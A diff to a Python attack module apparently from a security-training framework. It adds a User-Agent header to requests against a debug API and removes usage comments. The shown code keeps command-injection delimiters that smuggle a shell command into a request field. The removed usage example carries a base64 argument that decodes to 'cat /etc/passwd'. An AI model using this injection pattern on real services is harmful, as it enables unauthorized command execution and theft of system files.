@@ -1,19 +1,16 @@
 #!/usr/bin/env python
 # coding: UTF-8
-# usage: zansinapp_atk_debug_api.py <rhost>:<rport> <base64data([execute command])>
-#    ex: zansinpp_atk_debug_api.py 192.168.0.1:3000 Y2F0IC9ldGMvcGFzc3dk
 import requests
 import json
 import sys
 import base64
 
-
 class AtkDebugApi(object):
     def __init__(self, utility, host="127.0.0.1", port="3000", debug=False):
         self.utility = utility
-        self.utility.target = host
         self.host = host
         self.port = port
+        self.ua = utility.ua
         self.debug = debug
         self.request_header = 'a"}\'; '
         self.request_footer = '; echo # '
@@ -50,8 +47,9 @@ class AtkDebugApi(object):
             if self.debug:
                 self.logger("target_url: %s" % target_url1, "+")
             
-            # get docker information
-            response1 = session.get(target_url1, proxies=proxies, timeout=timeoutvalue)
+            # send request
+            headers = { "User-Agent": self.ua }
+            response1 = session.get(target_url1, proxies=proxies, headers=headers, timeout=timeoutvalue)
             
             self.logger("Attack End", "+")
 
